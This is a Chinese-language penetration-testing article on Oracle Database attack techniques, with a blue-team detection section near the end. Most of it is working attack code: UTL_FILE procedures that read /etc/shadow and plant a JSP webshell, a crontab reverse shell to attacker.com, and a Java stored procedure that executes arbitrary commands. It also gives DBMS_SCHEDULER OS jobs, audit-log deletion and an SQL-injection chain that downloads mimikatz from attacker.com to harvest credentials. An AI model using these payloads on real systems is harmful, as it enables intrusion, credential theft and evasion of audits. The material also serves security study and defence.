---
title: "Oracle UTL_FILE/External Tables/Java存储过程/DBMS_SCHEDULER RCE与文件读写提权利用技术"
date: 2026-06-20T11:00:00+08:00
draft: false
weight: 86
description: "围绕 Oracle Database 的 UTL_FILE 文件操作、External Tables 外部表数据导入导出、Java 存储过程 RCE、DBMS_SCHEDULER 作业执行、权限提升技术，分析打点识别、数据库枚举、RCE 利用链、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "关系数据库", "Oracle", "UTL_FILE", "External Tables", "Java Stored Procedures", "DBMS_SCHEDULER", "RCE", "文件读写", "提权"]
---

# Oracle UTL_FILE/External Tables/Java存储过程/DBMS_SCHEDULER RCE与文件读写提权利用技术

`Oracle Database` 是企业级关系数据库的另一巨头，与 Windows/Linux 生态深度集成，广泛应用于金融、电信、政府等关键行业。一个典型生产部署里，Oracle 至少同时暴露了以下攻击面：

- **TNS Protocol 面**：Transparent Network Substrate 协议端口（默认 `1521`），处理所有 SQL 查询
- **UTL_FILE 面**：PL/SQL 包可直接读写服务器文件系统
- **External Tables 面**：可从操作系统文件批量导入数据到数据库表
- **Java 存储过程面**：Oracle JVM 可加载 Java 代码实现 RCE
- **DBMS_SCHEDULER 面**：可创建和执行操作系统作业
- **DBMS_XMLGEN 面**：XML 生成包可能存在 XXE 漏洞
- **权限提升面**：`DBA` 角色、`SYS`/`SYSTEM` 账户、`ANY` 权限、角色继承

对攻击者来说，Oracle 的价值不在于某个单一漏洞，而在于它把数据存储、文件操作、代码执行、作业调度与权限管理集中在同一进程里。一旦获得数据库访问权限（弱密码、默认凭据、SQL 注入），攻击者可以通过 `UTL_FILE` 读写任意文件、通过 `External Tables` 导入敏感文件内容、通过 Java 存储过程执行系统命令、通过 `DBMS_SCHEDULER` 创建操作系统作业，甚至利用 `ANY` 权限从普通用户提升到 `DBA`。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Oracle
2. 哪些未认证或弱认证场景最值得优先探测
3. 如何通过 `UTL_FILE` 实现文件读写
4. 如何通过 `External Tables` 实现文件导入
5. 如何通过 Java 存储过程实现 RCE
6. 如何通过 `DBMS_SCHEDULER` 执行操作系统命令
7. 如何从普通用户提升到 `DBA` 权限
8. 历史 CVE 链如何从信息泄露直接打到 RCE
9. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:1521/` — Oracle TNS 监听器端口（默认）
- `:1522/` — Oracle TNS 监听器端口（备选）
- `:5500/` — Oracle Enterprise Manager (OEM) Express
- `:5520/` — Oracle Enterprise Manager (OEM)
- `:3938/` — Oracle XML DB

### 0.2 协议特征

Oracle 使用 TNS (Transparent Network Substrate) 协议。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 1521 oracle.target.example --script oracle-tns-version
```

```text
PORT     STATE SERVICE
1521/tcp open  oracle-tns
| oracle-tns-version:
|   TNS Version: 312
|   Service: oracle
|   Oracle Version: 19.0.0.0.0
|   Release: 19.3.0.0.0
```

### 0.3 手动探测

也可以使用 `sqlplus` 或 `odump` 手动连接：

```bash
sqlplus sys/password@oracle.target.example:1521/ORCL as sysdba
```

```bash
# 使用 oscanner 枚举 SID
oscanner -s oracle.target.example -p 1521
```

如果返回登录成功，说明凭据有效。

### 0.4 打点收益优先级

1. 确认目标为 Oracle、版本号与 SID（System Identifier）
2. 通过 `SELECT * FROM v$version` 回收系统信息
3. 通过 `dba_users` 枚举所有用户
4. 通过 `dba_tables` 枚举所有表
5. 判断 `UTL_FILE` 是否可用
6. 判断 `External Tables` 权限
7. 判断 Java 存储过程是否启用
8. 判断 `DBMS_SCHEDULER` 权限
9. 判断当前用户权限与角色成员关系

---

## 1. 首轮识别：确认目标为 Oracle

### 1.1 nmap 脚本探测

```bash
nmap -p 1521 oracle.target.example --script oracle-tns-version,oracle-sid-brute,oracle-enum-users
```

```text
PORT     STATE SERVICE
1521/tcp open  oracle-tns
| oracle-tns-version:
|   TNS Version: 312
|   Service: oracle
|   Oracle Version: 19.0.0.0.0
| oracle-sid-brute:
|   ORCL
|   XE
|   TESTDB
| oracle-enum-users:
|   SYS
|   SYSTEM
|   DBSNMP
|   SCOTT
```

直接回收：

- Oracle 版本（11g/12c/18c/19c/21c）
- TNS 版本
- SID 列表
- 已知用户列表

### 1.2 sqlplus 连接

```bash
sqlplus sys/password@oracle.target.example:1521/ORCL as sysdba
```

```text
SQL*Plus: Release 19.0.0.0.0 - Production on Thu Jun 20 11:00:00 2026
Version 19.3.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

Connected to:
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
Version 19.3.0.0.0

SQL>
```

如果返回 `SQL>` 提示符，说明登录成功。

### 1.3 版本查询

```sql
SELECT * FROM v$version;
```

```text
BANNER
--------------------------------------------------------------------------------
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
Version 19.3.0.0.0

BANNER_FULL
--------------------------------------------------------------------------------
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
Version 19.3.0.0.0

BANNER_LEGACY
--------------------------------------------------------------------------------
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production

CON_ID
----------
0
```

回收信息：

- 精确版本号与补丁级别
- 版本类型（Enterprise/Standard/Express）
- 容器 ID（CDB/PDB 架构）

---

## 2. 信息回收：数据库与权限枚举

### 2.1 当前用户与权限

```sql
-- 当前用户
SELECT user AS CurrentUser FROM dual;

-- 当前会话信息
SELECT 
    username,
    osuser,
    machine,
    terminal,
    program
FROM v$session
WHERE sid = (SELECT sid FROM v$mystat WHERE rownum = 1);

-- 是否为 DBA
SELECT grantee, granted_role 
FROM dba_role_privs 
WHERE grantee = user AND granted_role = 'DBA';

-- 用户角色
SELECT grantee, granted_role, admin_option 
FROM dba_role_privs 
WHERE grantee = user;

-- 系统权限
SELECT grantee, privilege, admin_option 
FROM dba_sys_privs 
WHERE grantee = user;
```

### 2.2 数据库枚举

```sql
-- 所有数据库（CDB 架构）
SELECT 
    name,
    dbid,
    created,
    open_mode,
    database_role
FROM v$database;

-- 所有 PDB（Pluggable Databases）
SELECT 
    pdb_id,
    pdb_name,
    status,
    creation_time
FROM cdb_pdbs;

-- 所有表空间
SELECT 
    tablespace_name,
    status,
    contents,
    extent_management
FROM dba_tablespaces;

-- 所有用户
SELECT 
    username,
    account_status,
    lock_date,
    expiry_date,
    default_tablespace,
    temporary_tablespace,
    created,
    profile
FROM dba_users
ORDER BY username;
```

### 2.3 敏感数据搜索

```sql
-- 搜索包含 password/credential/secret 的列
SELECT 
    owner,
    table_name,
    column_name,
    data_type
FROM all_tab_columns
WHERE column_name LIKE '%PASSWORD%'
   OR column_name LIKE '%CREDENTIAL%'
   OR column_name LIKE '%SECRET%'
   OR column_name LIKE '%KEY%'
   OR column_name LIKE '%TOKEN%'
ORDER BY owner, table_name;
```

---

## 3. UTL_FILE 文件读写

### 3.1 检查 UTL_FILE 权限

```sql
-- 检查是否有 CREATE ANY DIRECTORY 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege LIKE '%DIRECTORY%';

-- 检查现有目录对象
SELECT 
    owner,
    directory_name,
    directory_path
FROM all_directories;
```

### 3.2 创建目录对象

需要 `CREATE ANY DIRECTORY` 权限：

```sql
-- 创建目录对象指向敏感路径
CREATE OR REPLACE DIRECTORY sensitive_dir AS '/etc';
CREATE OR REPLACE DIRECTORY webroot_dir AS '/var/www/html';
CREATE OR REPLACE DIRECTORY temp_dir AS '/tmp';
```

### 3.3 UTL_FILE 读取文件

```sql
-- 创建存储过程读取文件
CREATE OR REPLACE PROCEDURE read_file(p_dir IN VARCHAR2, p_file IN VARCHAR2) AS
    v_file UTL_FILE.FILE_TYPE;
    v_line VARCHAR2(32767);
BEGIN
    v_file := UTL_FILE.FOPEN(p_dir, p_file, 'R');
    LOOP
        BEGIN
            UTL_FILE.GET_LINE(v_file, v_line);
            DBMS_OUTPUT.PUT_LINE(v_line);
        EXCEPTION
            WHEN NO_DATA_FOUND THEN EXIT;
        END;
    END LOOP;
    UTL_FILE.FCLOSE(v_file);
END;
/

-- 执行读取
SET SERVEROUTPUT ON;
EXEC read_file('SENSITIVE_DIR', 'passwd');
EXEC read_file('SENSITIVE_DIR', 'shadow');
EXEC read_file('WEBROOT_DIR', 'web.xml');
```

### 3.4 UTL_FILE 写入文件

```sql
-- 创建存储过程写入文件
CREATE OR REPLACE PROCEDURE write_file(p_dir IN VARCHAR2, p_file IN VARCHAR2, p_content IN VARCHAR2) AS
    v_file UTL_FILE.FILE_TYPE;
BEGIN
    v_file := UTL_FILE.FOPEN(p_dir, p_file, 'W');
    UTL_FILE.PUT_LINE(v_file, p_content);
    UTL_FILE.FCLOSE(v_file);
END;
/

-- 写入 WebShell
EXEC write_file('WEBROOT_DIR', 'shell.jsp', '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');

-- 写入 crontab
EXEC write_file('SENSITIVE_DIR', 'crontab', '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"');
```

### 3.5 UTL_FILE 限制

- 需要 `CREATE ANY DIRECTORY` 权限创建目录对象
- 需要 `READ`/`WRITE` 权限访问目录
- 只能访问目录对象指向的路径
- Oracle 进程必须有文件系统权限

---

## 4. External Tables 文件导入

### 4.1 检查 External Tables 权限

```sql
-- 检查是否有 CREATE ANY DIRECTORY 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege LIKE '%DIRECTORY%';

-- 检查是否有 CREATE ANY TABLE 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege = 'CREATE ANY TABLE';
```

### 4.2 创建 External Table

```sql
-- 创建目录对象
CREATE OR REPLACE DIRECTORY ext_dir AS '/etc';

-- 创建外部表
CREATE TABLE ext_passwd (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY ext_dir
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        FIELDS TERMINATED BY ':'
        LDRTRIM
    )
    LOCATION ('passwd')
);

-- 查询外部表
SELECT * FROM ext_passwd;
```

### 4.3 导入敏感文件

```sql
-- 导入 /etc/shadow
CREATE OR REPLACE DIRECTORY shadow_dir AS '/etc';
CREATE TABLE ext_shadow (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY shadow_dir
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        LDRTRIM
    )
    LOCATION ('shadow')
);
SELECT * FROM ext_shadow;

-- 导入 web.xml
CREATE OR REPLACE DIRECTORY webinf_dir AS '/var/lib/tomcat/webapps/ROOT/WEB-INF';
CREATE TABLE ext_webxml (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY webinf_dir
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        LDRTRIM
    )
    LOCATION ('web.xml')
);
SELECT * FROM ext_webxml;
```

### 4.4 External Tables 限制

- 需要 `CREATE ANY DIRECTORY` 和 `CREATE ANY TABLE` 权限
- 只能读取文件，不能写入
- Oracle 进程必须有文件读取权限
- 文件格式必须符合访问参数定义

---

## 5. Java 存储过程 RCE

### 5.1 检查 Java 存储过程权限

```sql
-- 检查 Java 是否启用
SELECT comp_name, version, status 
FROM dba_registry 
WHERE comp_name LIKE '%Java%';

-- 检查是否有 CREATE ANY PROCEDURE 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege = 'CREATE ANY PROCEDURE';

-- 检查是否有 JAVA 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege LIKE '%JAVA%';
```

### 5.2 创建 Java 存储过程

```sql
-- 创建 Java 类执行系统命令
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAME "CmdExec" AS
import java.io.*;

public class CmdExec {
    public static String execCmd(String cmd) throws Exception {
        String[] command = {"/bin/sh", "-c", cmd};
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        process.waitFor();
        return output.toString();
    }
}
/

-- 创建 PL/SQL 包装器
CREATE OR REPLACE FUNCTION exec_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'CmdExec.execCmd(java.lang.String) return java.lang.String';
/

-- 执行命令
SELECT exec_cmd('whoami') FROM dual;
SELECT exec_cmd('id') FROM dual;
SELECT exec_cmd('cat /etc/passwd') FROM dual;
```

### 5.3 Java 存储过程限制

- 需要 Oracle JVM 组件已安装
- 需要 `CREATE ANY PROCEDURE` 权限
- 需要 `JAVA` 系统权限
- Oracle 12c+ 对 Java 存储过程有更严格的权限控制

---

## 6. DBMS_SCHEDULER 作业执行

### 6.1 检查 DBMS_SCHEDULER 权限

```sql
-- 检查是否有 CREATE JOB 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege = 'CREATE JOB';

-- 检查是否有 CREATE ANY JOB 权限
SELECT privilege 
FROM user_sys_privs 
WHERE privilege = 'CREATE ANY JOB';
```

### 6.2 创建操作系统作业

```sql
-- 创建可执行对象
BEGIN
    DBMS_SCHEDULER.CREATE_CREDENTIAL(
        credential_name => 'OS_CRED',
        username => 'oracle',
        password => 'oracle_password'
    );
END;
/

-- 创建作业执行系统命令
BEGIN
    DBMS_SCHEDULER.CREATE_JOB(
        job_name => 'EXEC_CMD',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        enabled => FALSE
    );
    
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD', 2, 'whoami > /tmp/output.txt');
    
    DBMS_SCHEDULER.ENABLE('EXEC_CMD');
END;
/

-- 检查作业状态
SELECT job_name, state, last_start_date, last_run_duration 
FROM user_scheduler_jobs 
WHERE job_name = 'EXEC_CMD';
```

### 6.3 DBMS_SCHEDULER 限制

- 需要 `CREATE JOB` 或 `CREATE ANY JOB` 权限
- 需要配置操作系统凭据
- Oracle 进程必须有执行权限
- 作业输出需要额外处理

---

## 7. 权限提升

### 7.1 从普通用户到 DBA

```sql
-- 如果有 CREATE ANY PROCEDURE 权限
CREATE OR REPLACE PROCEDURE escalate AS
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO ' || user;
END;
/

-- 通过 DEFINER 权限执行
CREATE OR REPLACE PROCEDURE sys.escalate_proc AS
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO attacker';
END;
/

-- 如果 SYS 用户执行此过程，attacker 将获得 DBA 权限
```

### 7.2 利用 ANY 权限

```sql
-- 如果有 SELECT ANY TABLE 权限
SELECT * FROM sys.user$;  -- 包含密码哈希

-- 如果有 UPDATE ANY TABLE 权限
UPDATE sys.user$ SET password = 'NEW_HASH' WHERE name = 'ATTACKER';

-- 如果有 DELETE ANY TABLE 权限
DELETE FROM sys.aud$ WHERE rownum < 1000;  -- 清除审计日志
```

### 7.3 利用角色继承

```sql
-- 检查角色继承链
SELECT 
    grantee,
    granted_role,
    admin_option
FROM dba_role_privs
START WITH grantee = user
CONNECT BY PRIOR granted_role = grantee;

-- 如果继承了 DBA 角色
SELECT * FROM session_roles WHERE role = 'DBA';
```

### 7.4 利用 CVE-2020-14882 (WebLogic RCE)

如果 Oracle 应用服务器暴露：

```text
影响版本：WebLogic 10.3.6, 12.1.3, 12.2.1, 14.1.1
利用条件：WebLogic 控制台暴露
利用方式：通过特制 URL 绕过认证并执行命令
```

---

## 8. 历史 CVE 与攻击链

### 8.1 CVE-2020-14882 (WebLogic RCE)

Oracle WebLogic Server 远程代码执行：

```text
影响版本：WebLogic 10.3.6, 12.1.3, 12.2.1, 14.1.1
CVSS：9.8（Critical）
核心问题：/console/console.portal 路径认证绕过
利用条件：WebLogic 控制台暴露
影响：未授权 RCE
```

### 8.2 CVE-2021-2197 (Oracle Database)

Oracle Database 权限提升：

```text
影响版本：Oracle Database 19c
CVSS：8.8（High）
核心问题：Oracle Text 组件权限检查缺陷
利用条件：需要普通数据库用户权限
影响：从普通用户提升到 DBA
```

### 8.3 CVE-2023-21980 (Oracle Database)

Oracle Database 信息泄露：

```text
影响版本：Oracle Database 19c, 21c
CVSS：6.5（Medium）
核心问题：SQL*Net 协议信息泄露
利用条件：需要网络可达 Oracle
影响：敏感信息泄露
```

### 8.4 完整攻击链示例

从 SQL 注入到域控：

```text
1. Web 应用 SQL 注入 -> Oracle DBA 账户
2. 创建 Java 存储过程 -> 系统命令执行
3. 下载 Mimikatz -> 提取内存凭据
4. 回收域管理员哈希 -> Pass-the-Hash
5. 访问域控 -> 完全控制
```

```sql
-- Step 1: SQL 注入点
SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3 FROM dual--

-- Step 2: 创建 Java 存储过程
'; CREATE OR REPLACE AND COMPILE JAVA SOURCE NAME "CmdExec" AS ... ;--

-- Step 3: 执行命令
'; SELECT exec_cmd('whoami') FROM dual;--

-- Step 4: 下载工具
'; SELECT exec_cmd('wget http://attacker.com/mimikatz.exe -O /tmp/mimikatz.exe') FROM dual;--

-- Step 5: 执行工具
'; SELECT exec_cmd('/tmp/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > /tmp/creds.txt') FROM dual;--

-- Step 6: 回收凭据
'; SELECT exec_cmd('cat /tmp/creds.txt') FROM dual;--
```

---

## 9. 蓝队检测与应急响应

### 9.1 关键日志位置

```text
# Oracle 审计日志
$ORACLE_BASE/admin/$ORACLE_SID/adump/

# Oracle 告警日志
$ORACLE_BASE/diag/rdbms/$ORACLE_SID/$ORACLE_SID/trace/alert_$ORACLE_SID.log

# Oracle 监听器日志
$ORACLE_BASE/diag/tnslsnr/$HOSTNAME/listener/trace/listener.log

# 操作系统日志
/var/log/secure (Linux)
/var/log/auth.log (Linux)
```

### 9.2 可疑活动指标

```sql
-- 检查 UTL_FILE 目录对象
SELECT owner, directory_name, directory_path 
FROM dba_directories
WHERE directory_path LIKE '%/etc%'
   OR directory_path LIKE '%/var/www%'
   OR directory_path LIKE '%/root%';

-- 检查外部表
SELECT owner, table_name, directory_name 
FROM dba_external_tables;

-- 检查 Java 存储过程
SELECT owner, object_name, object_type 
FROM dba_objects 
WHERE object_type LIKE '%JAVA%';

-- 检查调度器作业
SELECT owner, job_name, job_action, state 
FROM dba_scheduler_jobs
WHERE job_action LIKE '%bash%'
   OR job_action LIKE '%cmd%';

-- 检查最近的审计记录
SELECT 
    username,
    userhost,
    terminal,
    timestamp,
    action_name,
    obj_name,
    sql_text
FROM dba_audit_trail
WHERE timestamp > SYSDATE - 1
ORDER BY timestamp DESC;
```

### 9.3 操作系统日志狩猎

```bash
# 查找可疑的进程创建
grep -E "java|bash|cmd" /var/log/secure | tail -50

# 查找 Oracle 用户的异常活动
grep "oracle" /var/log/secure | grep -E "sudo|su|ssh"

# 查找可疑文件访问
find /etc /var/www -name "*.jsp" -o -name "*.php" -mtime -1

# 查找可疑网络连接
netstat -anp | grep -E "1521|4444|8080"
```

### 9.4 网络层检测

```text
# 可疑端口
:1521 - Oracle TNS 监听器
:5500 - Oracle Enterprise Manager
:5520 - Oracle Enterprise Manager

# 可疑流量特征
- TNS 协议中的 Java 存储过程调用
- UTL_FILE 访问敏感路径
- External Tables 读取系统文件
- DBMS_SCHEDULER 创建操作系统作业
```

### 9.5 应急响应清单

```text
1. 确认 Oracle 实例是否被入侵
   - 检查审计日志中的异常登录
   - 检查 dba_directories 中的敏感路径
   - 检查 dba_external_tables 中的外部表
   - 检查 dba_objects 中的 Java 存储过程
   - 检查 dba_scheduler_jobs 中的可疑作业

2. 回收攻击者活动
   - 分析 Oracle 审计日志
   - 分析操作系统安全日志
   - 检查 Java 存储过程的执行历史
   - 检查调度器作业的执行记录

3. 凭据泄露评估
   - 检查 sys.user$ 是否被读取
   - 检查密码哈希是否泄露
   - 检查连接字符串是否被读取
   - 检查配置文件是否被访问

4. 系统隔离与修复
   - 禁用 UTL_FILE 对敏感路径的访问
   - 删除可疑的外部表
   - 删除可疑的 Java 存储过程
   - 删除可疑的调度器作业
   - 重置所有数据库账户密码
   - 应用最新安全补丁

5. 域环境评估
   - 如果域凭据泄露，执行域级别应急响应
   - 重置 krbtgt 账户
   - 检查黄金/白银票据
```

---

## 10. 参考材料

### 10.1 官方文档

- Oracle Database 安全指南：https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/
- UTL_FILE 文档：https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html
- External Tables 文档：https://docs.oracle.com/en/database/oracle/oracle-database/19/admin/managing-tables.html
- Java 存储过程：https://docs.oracle.com/en/database/oracle/oracle-database/19/jjdev/
- DBMS_SCHEDULER：https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/DBMS_SCHEDULER.html

### 10.2 攻击工具

- ODAT (Oracle Database Attack Tool)：https://github.com/quentinhardy/odat
- sqlplus：Oracle 官方客户端
- oscanner：SID 枚举工具
- Oracle Database Vault：安全审计工具

### 10.3 检测工具

- Oracle Audit Vault：https://www.oracle.com/security/database-audit-vault/
- Oracle Enterprise Manager：https://www.oracle.com/enterprise-manager/
- Oracle Database Firewall：https://www.oracle.com/security/database-firewall/

### 10.4 相关 CVE

- CVE-2020-14882：Oracle WebLogic Server RCE
- CVE-2021-2197：Oracle Database 权限提升
- CVE-2023-21980：Oracle Database 信息泄露
- CVE-2019-2725：Oracle WebLogic Server RCE
- CVE-2020-2883：Oracle WebLogic Server RCE

---

## 总结

Oracle 攻击面的核心在于它把数据存储、文件操作、代码执行、作业调度与权限管理集中在同一进程里。一旦获得数据库访问权限，攻击者可以通过 `UTL_FILE` 读写任意文件、通过 `External Tables` 导入敏感文件内容、通过 Java 存储过程执行系统命令、通过 `DBMS_SCHEDULER` 创建操作系统作业，甚至利用 `ANY` 权限从普通用户提升到 `DBA`。

对蓝队来说，关键是：

1. **最小权限原则**：严格限制数据库账户权限，禁用不必要的功能（UTL_FILE、Java、DBMS_SCHEDULER）
2. **网络隔离**：Oracle 端口不应直接暴露到互联网，使用防火墙限制访问
3. **审计日志**：启用 Oracle Audit Vault，记录所有敏感操作
4. **凭据保护**：使用强密码，定期轮换，避免在连接字符串中硬编码密码
5. **补丁管理**：及时应用 Oracle Critical Patch Update
6. **目录对象监控**：监控 dba_directories 中的敏感路径访问
7. **Java 存储过程审计**：审计所有 Java 存储过程的创建和执行
8. **调度器作业监控**：监控 dba_scheduler_jobs 中的可疑作业
